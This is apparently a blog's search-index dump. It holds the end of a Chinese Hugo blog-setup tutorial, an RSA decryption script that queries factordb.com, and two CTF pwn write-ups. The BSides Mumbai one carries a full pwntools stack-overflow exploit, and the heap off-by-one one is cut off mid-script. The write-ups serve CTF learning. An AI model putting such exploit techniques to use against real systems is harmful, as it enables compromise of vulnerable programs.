email，会在检测到新文章后自动生成邮件发送\nfollow.it还自带RSS阅读器，这样我们的RSS页面可以变的更美观，效果见我的RSS页面\n在博客内部某个地方添加订阅入口 记得在自己的博客内部增加一个进入订阅页面的入口，可以把订阅页面(https://tinyletter.com/\u0026lt;你的名字\u0026gt;)下载下来（可以自定义样式），放在themes/eureka/layouts/_default并重命名为subscribe.html，然后新建/content/subscribe/subscribe.md并填入frontmatter：\n--- layout: subscribe title: \u0026#34;订阅\u0026#34; date: 2023-01-07T17:06:54+08:00 draft: false slug: \u0026#34;subscribe\u0026#34; --- 然后在about页加一个小按钮：\n具体代码示例如下：\n\u0026lt;style\u0026gt; .button { font-family: 宋体,\u0026#39;Comic Sans MS\u0026#39;, cursive; color: #FFFFFF; background-color: #333333; display: inline-block; white-space: nowrap; height: 40px; line-height: 42px; margin: 0 5px 0 0; padding: 0 22px; text-decoration: none; /* text-transform: uppercase; */ text-align: center; font-weight: medium; font-style: normal; font-size: 14px; cursor: pointer; border: 0; -moz-border-radius: 4px; border-radius: 4px; -webkit-border-radius: 4px; vertical-align: top; -webkit-font-smoothing: antialiased; font-smoothing: antialiased; } \u0026lt;/style\u0026gt; \u0026lt;a href=\u0026#34;/subscribe/\u0026#34;\u0026gt;\u0026lt;button class=\u0026#34;button\u0026#34;\u0026gt;立即订阅个人博客\u0026lt;/button\u0026gt;\u0026lt;/a\u0026gt; 还可以在各种地方添加一个小铃铛图片，这样用户更容易找到你的订阅入口，而不用返回到主页\n让你的博客能被google等搜索引擎找到 google可以使用Google Search Console，详见让Google搜索到自己的博客\nbing可以使用Bing Webmaster Tools，详见如何讓你的 WordPress 網站能被 Bing 索引？ | 小翔教你SEO，注意bing是可以导入google search console的数据的，因此建议先设置google\n百度同理，使用普通收录_加快网站内容抓取，快速提交数据工具_站长工具_网站支持_百度搜索资源平台\n更多阅读：\nHexo 配置主流搜索引擎收录流程记录 | 乐园 使黑色图片在深色模式下反转为白色图片 下面提供一个示例。\n比如我在about.md中定义的头像是黑色透明背景的，在深色模式下就完全看不清图片：\n我们可以在themes/eureka/layouts/partials/widgets/about.html文件头部加上：\n\u0026lt;style\u0026gt; .dark .avatar{ filter: invert(100%); } \u0026lt;/style\u0026gt; 然后给alt=\u0026quot;Avatar\u0026quot;的img标签加上avatar类：\n效果：\n让深浅颜色变换更平滑 在themes/eureka/layouts/partials/head.html中增加：\n\u0026lt;style\u0026gt; .dark{ transition: 1.5s; } .light{ transition: 1.5s; } \u0026lt;/style\u0026gt; 然后因为eureka主题实现深浅变化是根据有没有dark类来区分的，所以没有light类，因此我们需要更改themes/eureka/layouts/_default/baseof.html中的html标签：\n\u0026lt;html lang=\u0026#34;{{ .Site.LanguageCode }}\u0026#34; dir=\u0026#34;{{ .Site.Language.LanguageDirection | default \u0026#34;ltr\u0026#34; }}\u0026#34; {{ if eq .Site.Params.colorScheme \u0026#34;dark\u0026#34; }}class=\u0026#34;dark\u0026#34; {{ else }} class=\u0026#34;light\u0026#34; {{ end }} \u0026gt; 这样在深浅主题变化的时候，颜色过渡就会平滑一点了，具体成果见我的博客\n增加回到开头按钮 在末尾增加：\n\u0026lt;style\u0026gt; .black-circle{ height: 45px; width: 45px; display: block; font-size: 30px; transition: all 1.5s; position:fixed; right:0px; bottom:0px; z-index: 100; background: transparent; } .black-circle:hover{ transform: translateY(-10px); } \u0026lt;/style\u0026gt; \u0026lt;script\u0026gt; function goTop(acceleration, time) { acceleration = acceleration || 0.1; time = time || 16; var x1 = 0; var y1 = 0; var x2 = 0; var y2 = 0; var x3 = 0; var y3 = 0; if (document.documentElement) { x1 = document.documentElement.scrollLeft || 0; y1 = document.documentElement.scrollTop || 0; } if (document.body) { x2 = document.body.scrollLeft || 0; y2 = document.body.scrollTop || 0; } var x3 = window.scrollX || 0; var y3 = window.scrollY || 0; // 滚动条到页面顶部的水平距离 var x = Math.max(x1, Math.max(x2, x3)); // 滚动条到页面顶部的垂直距离 var y = Math.max(y1, Math.max(y2, y3)); // 滚动距离 = 目前距离 / 速度, 因为距离原来越小, 速度是大于 1 的数, 所以滚动距离会越来越小 var speed = 1 + acceleration; window.scrollTo(Math.floor(x / speed), Math.floor(y / speed)); // 如果距离不为零, 继续调用迭代本函数 if(x \u0026gt; 0 || y \u0026gt; 0) { var invokeFunction = goTop( acceleration , time ); window.setTimeout(invokeFunction, time); } } \u0026lt;/script\u0026gt; \u0026lt;a\u0026gt;\u0026lt;i id=\u0026#34;return-top\u0026#34; class=\u0026#34;fa-solid fa-circle-up black-circle\u0026#34; onclick=\u0026#34;goTop(0.1, 16)\u0026#34;\u0026gt;\u0026lt;/i\u0026gt;\u0026lt;/a\u0026gt; 感谢关于top按钮的网页设置 - zhunaoke - 博客园中提供的代码\n具体效果：\n增加图片放大查看功能 本部分灵感来自于Hugo 使用 Fancybox 实现图片灯箱/放大功能 - atpX，其作者灵感来自于maupassant-hugo/render-image.html at master · flysnow-org/maupassant-hugo · GitHub，但是该文作者的方法似乎有误，我更改了以后在我的页面上终于可以使用了\n在params.yaml添加：\nfancybox : true 或者在config.yaml添加：\nparams: fancybox : true 然后新建themes/eureka/layouts/_default/_markup/render-image.html（包括文件夹），添加代码：\n{{- $img_destination := .Destination -}} {{- if (and .Page.Site.Params.image_cdn.enable (not .Page.Site.IsServer)) -}} {{if hasPrefix .Destination \u0026#34;/\u0026#34; }} {{ $img_destination = (print .Page.Site.Params.image_cdn.HOST .Destination) }} {{ else if not (hasPrefix .Destination \u0026#34;http\u0026#34;) }} {{ $img_destination = (print .Page.Site.Params.image_cdn.HOST (path.Join .Page.RelPermalink .Destination)) }} {{ end }} {{- end -}} {{- if .Title -}} \u0026lt;figure class=\u0026#34;max-w-2xl mx-auto overflow-hidden\u0026#34;\u0026gt; {{if .Page.Site.Params.fancybox }} \u0026lt;a data-fancybox=\u0026#34;gallery\u0026#34; href=\u0026#34;{{ $img_destination | safeURL }}\u0026#34;\u0026gt; \u0026lt;img alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; {{ else }} \u0026lt;img alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; {{ end }} \u0026lt;figcaption class=\u0026#34;p-2 text-center\u0026#34;\u0026gt;{{ with $.Title | safeHTML }}{{ . }}{{ end }}\u0026lt;/figcaption\u0026gt; \u0026lt;/figure\u0026gt; {{- else -}} {{if .Page.Site.Params.fancybox }} \u0026lt;a data-fancybox=\u0026#34;gallery\u0026#34; href=\u0026#34;{{ $img_destination | safeURL }}\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;mx-auto\u0026#34; alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; \u0026lt;/a\u0026gt; {{ else }} \u0026lt;img class=\u0026#34;mx-auto\u0026#34; alt=\u0026#34;{{ $.Text }}\u0026#34; src=\u0026#34;{{ $img_destination | safeURL }}\u0026#34; /\u0026gt; {{ end }} {{- end -}} ✍️ps.该代码与maupassant-hugo/render-image.html at master · flysnow-org/maupassant-hugo · GitHub的代码一致\n在themes/eureka/layouts/partials/custom-head.html增加（也可以在同目录下的head.html或footer.html增加）以下代码：\n{{if .Page.Site.Params.fancybox }} \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css\u0026#34; /\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; {{ end }} 以后如果不想要图片放大功能了，只用更改fancybox的值就可以了\n在文章开头增加版权声明 我们希望在自己原创的文章开头放一个版权声明，但是在自己转载的文章开头又不放，我们可以在themes/eureka/layouts/partials/components/post-article.html内的{{ .Content }}上方加上：\n{{ if (or (not .Params.reprint) ( not ( in \u0026#34;true\u0026#34; .Params.reprint )) ) }} \u0026lt;b\u0026gt;\u0026lt;p\u0026gt;⚠️本文是\u0026lt;a href=\u0026#34;https://github.com/PeterLiu-all\u0026#34;\u0026gt;作者P3troL1er\u0026lt;/a\u0026gt;原创，首发于\u0026lt;a href=\u0026#34;{{ .Permalink }}\u0026#34;\u0026gt;{{ .Site.BaseURL }}\u0026lt;/a\u0026gt;。商业转载请联系作者获得授权，非商业转载请注明出处！\u0026lt;/p\u0026gt;\u0026lt;/b\u0026gt; {{ end }} 复制内容自动增加版权信息 我们希望所有复制的文字和html都在末尾附上版权信息还有自己网站的链接，但是按copy按钮复制的代码却不希望加上信息（这样会很麻烦），于是我更改了复制网页内容自动添加版权信息的方法_idjl的博客-CSDN博客的代码，在themes/eureka/layouts/partials/custom-head.html末尾加上：\n\u0026lt;script language=\u0026#34;javascript\u0026#34;\u0026gt; function setClipboardText(event) { event.preventDefault();//阻止元素发生默认的行为（例如，当点击提交按钮时阻止对表单的提交）。 var node = document.createElement(\u0026#39;div\u0026#39;); //对documentfragment不熟，不知道怎么获取里面的内容，用了一个比较笨的方式 node.appendChild(window.getSelection().getRangeAt(0).cloneContents()); //getRangeAt(0)返回对基于零的数字索引与传递参数匹配的选择对象中的范围的引用。对于连续选择，参数应为零。 var htmlData = \u0026#34;\u0026lt;div\u0026gt;\u0026#34; + node.innerHTML + \u0026#34;\u0026lt;br /\u0026gt;\u0026lt;br /\u0026gt;著作权归作者P3troL1er所有。\u0026lt;br /\u0026gt;\u0026#34; + \u0026#34;商业转载请联系作者P3troL1er获得授权，非商业转载请注明出处。\u0026lt;br /\u0026gt;\u0026#34; + \u0026#39;作者：P3troL1er\u0026lt;br /\u0026gt;链接：\u0026lt;a href=\u0026#34;https://peterliuzhi.top/\u0026#34;\u0026gt;https://peterliuzhi.top/\u0026lt;/a\u0026gt;\u0026lt;br /\u0026gt;\u0026#39; + \u0026#34;\u0026lt;/div\u0026gt;\u0026#34;; var textData = \u0026#34;\u0026#34; if (window.getSelection().anchorNode.parentElement.className == \u0026#34;highlight\u0026#34;) textData = window.getSelection().getRangeAt(0) else textData = window.getSelection().getRangeAt(0) + \u0026#34;\\n\\n著作权归作者所有。\\n\u0026#34; + \u0026#34;商业转载请联系作者获得授权，非商业转载请注明出处。\\n\u0026#34; + \u0026#34;作者：P3troL1er\\n链接：https://peterliuzhi.top/\\n\u0026#34;; if (event.clipboardData) { event.clipboardData.setData(\u0026#34;text/html\u0026#34;, htmlData); //setData(剪贴板格式, 数据) 给剪贴板赋予指定格式的数据。返回 true 表示操作成功。 event.clipboardData.setData(\u0026#34;text/plain\u0026#34;, textData); } else if (window.clipboardData) { //window.clipboardData的作用是在页面上将需要的东西复制到剪贴板上，提供了对于预定义的剪贴板格式的访问，以便在编辑操作中使用。 return window.clipboardData.setData(\u0026#34;text\u0026#34;, textData); } } document.addEventListener(\u0026#34;copy\u0026#34;, function (e) { setClipboardText(e); }); \u0026lt;/script\u0026gt; 增加友链页面 新建layouts/shortcodes/friend.html（包括文件夹），写入：\n{{- if .IsNamedParams -}} \u0026lt;a target=\u0026#34;_blank\u0026#34; href={{ .Get \u0026#34;url\u0026#34; }} title={{ .Get \u0026#34;name\u0026#34; }} class=\u0026#34;friendurl\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;frienddiv\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;frienddivleft\u0026#34;\u0026gt; \u0026lt;img class=\u0026#34;myfriend\u0026#34; src={{ .Get \u0026#34;logo\u0026#34; }} /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;frienddivright\u0026#34;\u0026gt; \u0026lt;b\u0026gt; \u0026lt;div class=\u0026#34;friendname\u0026#34;\u0026gt;{{- .Get \u0026#34;name\u0026#34; -}}\u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;friendinfo\u0026#34;\u0026gt;{{- .Get \u0026#34;word\u0026#34; -}}\u0026lt;/div\u0026gt; \u0026lt;/b\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/a\u0026gt; {{- end }} 然后新建content/friend/links.md写入：\n--- title: Links reprint: true date: 2023-01-19T21:51:25+08:00 --- \u0026lt;style\u0026gt; .friendurl { text-decoration: none !important; color: black; box-shadow: none !important; } .myfriend { width: 56px !important; height: 56px !important; border-radius: 50%!important; padding: 2px; margin-top: 20px !important; margin-left: 14px !important; background-color: transparent; } .frienddiv { overflow: auto; height: 100px; width: 49%; display: inline-block !important; border-radius: 5px; border-width: 0 !important; border-color: transparent !important; -moz-box-shadow: 0 1px 6px rgba(0, 0, 0, .12); -webkit-box-shadow: 0 1px 6px rgba(0, 0, 0, .12); box-shadow: 0 1px 6px rgba(0, 0, 0, .12); background: none; overflow:hidden; -webkit-transition: all ease-out 1s; -moz-transition: all ease-out 1s; -o-transition: all ease-out 1s; transition: all ease-out 1s; } .dark .frienddiv{ -moz-box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; -webkit-box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; box-shadow: 0 1px 6px rgba(255, 255, 255, 0.12) !important; } .dark .frienddiv:hover { background: var(--code-bg); } .frienddiv:hover { background: var(--theme); transition: transform 1s; webkit-transform: scale(1.1); -moz-transform: scale(1.2); -ms-transform: scale(1.2); -o-transform: scale(1.2); transform: scale(1.1); } .frienddiv:hover .frienddivleft img { transition: 0.9s !important; -webkit-transition: 0.9s !important; -moz-transition: 0.9s !important; -o-transition: 0.9s !important; -ms-transition: 0.9s !important; transform: rotate(360deg) !important; -webkit-transform: rotate(360deg) !important; -moz-transform: rotate(360deg) !important; -o-transform: rotate(360deg) !important; -ms-transform: rotate(360deg) !important; } .frienddivleft { width: 92px; float: left; margin-right: -5px; } .frienddivright { margin-top: 18px; margin-right: 18px; } .friendname { text-overflow: ellipsis; } .dark .friendname,.dark .friendinfo{ color: white; } .friendinfo { text-overflow: ellipsis; } @media screen and (max-width: 600px) { .friendinfo { display: none; } .frienddivleft { width: 84px; margin: auto; } .frienddivright { height: 100%; margin: auto; display: flex; align-items: center; justify-content: center; } .friendname { font-size: 18px; } } \u0026lt;/style\u0026gt; \u0026lt;!-- 记得把\u0026#34;\\\u0026#34;删掉，因为hugo的shortcode的原因不能直接打两个{ --\u0026gt; \\{\\{\u0026lt; friend name=\u0026#34;P3troL1er的博客\u0026#34; url=\u0026#34;https://peterliuzhi.top/\u0026#34; logo=\u0026#34;https://peterliuzhi.top/images/avatar.png\u0026#34; word=\u0026#34;P3troL1er的博客\u0026#34; \u0026gt;\\}\\} \u0026lt;br\u0026gt;\u0026lt;hr\u0026gt; 顺便一提，记得给友链页面设置入口，可以在menus.yaml设置：\nmain: - name: Friends url: /friend/links/ weight: 6 感谢Hugo博客添加友链 - 腾讯云开发者社区-腾讯云中提供的代码\n目前来说，作者就添加了这么点功能，要是以后探索到更多有趣的功能，会更新这篇文章，所以，愿意订阅我的博客吗？\n","date":"2023年01月08日","permalink":"https://peterliuzhi.top/posts/%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%E6%90%AD%E5%BB%BAhugo%E5%8D%9A%E5%AE%A2/","section":"posts","summary":"Serious sport has nothing to do with fair play. It is bound up with hatred, jealousy, boastfulness, disregard of all rules and sadistic pleasure in witnessing violence. In other words, it is war minus the shooting. — George Orwell 安装 hugo hugo 中文文档 在releases 界面下载 hugo 的 exe 文件（windows可以","tags":["杂谈","hugo","博客"],"title":"保姆级教程——搭建Hugo博客"},{"categories":null,"contents":"","date":"2023年01月07日","permalink":"https://peterliuzhi.top/subscribe/subscribe/","section":"subscribe","summary":"","tags":null,"title":"订阅"},{"categories":["tricks","scripts"],"contents":" Tragedy is a tool for the living to gain wisdom, not a guide by which to live. — Robert F. Kennedy\nfactordb.com的分解速度很快，解密RSA的过程中我们可能会用到，于是我写了一个基础爬虫python脚本从factordb.com请求数据得到p和q后求逆得到d自动解密c，脚本不是很优雅，如果有师傅能改进，烦请师傅贴在评论区造福后来人，感谢您\n脚本 import re import requests from bs4 import BeautifulSoup import gmpy2 from Crypto.Util.number import * c = 0 n = 0 print(f\u0026#34;[+]n={n}\u0026#34;) p_q = [] # 一般来说需要代理才能连上网络，有些代理加速器也不用这样配置 proxies = {\u0026#34;http\u0026#34;: \u0026#34;http://?.?.?.?:?\u0026#34;, \u0026#34;https\u0026#34;: \u0026#34;http://?.?.?.?:?\u0026#34;, } url = \u0026#34;http://factordb.com/index.php?\u0026#34; html_doc = requests.get(url, params={\u0026#34;query\u0026#34;: n}, proxies=proxies) # 创建一个BeautifulSoup解析对象 soup = BeautifulSoup(html_doc.text, \u0026#34;html.parser\u0026#34;, from_encoding=\u0026#34;utf-8\u0026#34;) # 获取所有的链接 links = soup.find_all(\u0026#39;a\u0026#39;) print(\u0026#34;所有的链接:\u0026#34;) full_link = [] for link in links: if link is not None \\ and link.get(\u0026#39;href\u0026#39;) is not None \\ and \u0026#34;index.php?id=\u0026#34; in link.get(\u0026#39;href\u0026#39;): full_link.append(f\u0026#34;http://factordb.com/{link.get(\u0026#39;href\u0026#39;)}\u0026#34;) print(full_link[-1]) # 从链接中获取p和q for link in full_link: html_doc = requests.get(link) tmp_soup = BeautifulSoup( html_doc.text, \u0026#34;html.parser\u0026#34;, from_encoding=\u0026#34;utf-8\u0026#34;) content = tmp_soup.select( \u0026#34;body \u0026gt; form \u0026gt; center \u0026gt; input[type=text]:nth-child(1)\u0026#34;) num = int(content[0].get(\u0026#34;value\u0026#34;)) if num != n: p_q.append(num) p, q = p_q print(f\u0026#34;[+]p={p}\u0026#34;) print(f\u0026#34;[+]q={q}\u0026#34;) # 求欧拉函数 phi = (p-1)*(q-1) # 求e的逆d e = 0 d = gmpy2.invert(e, phi) # 用私钥解密 m = pow(c, d, n) print(f\u0026#34;[+]对c={c}的解密结果是：\u0026#34;) result = long_to_bytes(m) try: print(result.decode(\u0026#34;UTF-8\u0026#34;)) except Exception as e: print(result) 运行结果示例 ","date":"2023年01月06日","permalink":"https://peterliuzhi.top/tricks/rsa%E5%9F%BA%E7%A1%80%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC%E4%BD%BF%E7%94%A8factordb.com%E5%88%86%E8%A7%A3n/","section":"tricks","summary":"Tragedy is a tool for the living to gain wisdom, not a guide by which to live. — Robert F. Kennedy factordb.com的分解速度很快，解密RSA的过程中我们可能会用到，于是我写了一个基础爬虫python","tags":["crypto"],"title":"RSA基础解密脚本（使用factordb.com分解n）"},{"categories":["writeup","BSides Mumbai"],"contents":" When I let go of what I am, I become what I might be. — Laozi\n附件程序\nchecksec查看程序架构 ida查看伪C代码 我们可以通过程序给的printf来得到buf的地址，也就是栈地址\n在vuln函数中有一个明显的栈溢出漏洞，但是它能溢出的长度很微妙，没有办法直接调用win函数，因为win函数要求多个参数：\n但我们知道，虽然64位系统的函数调用的前六个参数是保存在寄存器中的，但是我们看win函数的汇编代码，最后还是要读到栈中，因此我们可以先将三个参数安排在栈中，同时控制rbp的值，跳过将参数读入到栈中的过程：\n但是还有一个问题，我们只能读入0x2C个字节，同时因为PIE的存在，我们不知道win函数的实际地址，这该怎么在vuln函数中转入win函数？\n我们调试发现，vuln函数原本的返回地址是main+104，而win函数恰好在main下面：\n又因为页机制的存在，函数地址的最后三位是不变的，所以我们只需要更改最后一个字节就好\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = False fn: str = \u0026#34;./BSides-chall\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;1337\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;34.70.253.176\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x1320) b* $rebase(0x131A) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... sendline_after_clean() stack = recv_and_transform(\u0026#34;0x\u0026#34;, from_bytes=False, bound=\u0026#34;\\n\u0026#34;) suclog( stack=stack ) payload = flat([ stack, p32(11534522) + p32(1590475454) ]).ljust(0x20, b\u0026#34;\\x00\u0026#34;) + flat([ stack - 38, p8(0x8E) ]) send_after_clean(payload) interactive_after_clean(no_show=False) ","date":"2023年01月04日","permalink":"https://peterliuzhi.top/writeup/bsides-mumbai-2022-pwnwarmup/","section":"writeup","summary":"When I let go of what I am, I become what I might be. — Laozi 附件程序 checksec查看程序架构 ida查看伪C代码 我们可以通过程序给的printf来得到buf的地址，也就是栈地址","tags":["pwn"],"title":"【BSides Mumbai 2022 PWN】Warmup"},{"categories":["writeup"],"contents":" No man is free who is not master of himself. — Epictetus\n原题链接\nchecksec查看程序架构 ida查看伪C代码 create_heap 分配的chunk结构体包括一个保存size的int，和一个指向其他内存的指针：\n其中第二个chunk的大小是任意的，这上面就可以做文章\nedit_heap 我们可以看到，最后读取到的内容会比保存的大小多1：\n如果我们分配的大小刚刚好涵盖了prev_size这个域，那么我们的输入就可以更改下一个chunk的size域\nshow_heap 看到这个函数，我们马上想到，如果将heaparray[v1]-\u0026gt;ptr改成某个函数的got值，就可以泄露出libc基址\ndelete_heap 这个函数在释放后会将指针归零，因此用不了UAF\n大致思路 这道题的关键是我们要获得更改heaparray[v1]-\u0026gt;ptr这个指针的能力，而显而易见的，最明显的溢出漏洞在edit_heap那里有一个off by one漏洞，我们可以更改下一个chunk的size域，让它覆盖掉下面几个chunk，这样释放后再分配的时候就能获得更改被覆盖的chunk的权利\nchunk overlap 更多阅读：Chunk Extend and Overlapping - CTF Wiki\n需要注意的是，我们输入的size是0x18，但是由于size位的存在，最后分配得到的chunk大小是0x20\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./heapcreator\u0026#34; libc_name: str = \u0026#34;/home/kali/share/share_files/security/buuctf_libc/libc-2.23_64.so\u0026#34; port: str = \u0026#34;26654\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;node4.buuoj.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: info(f\u0026#34;received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, 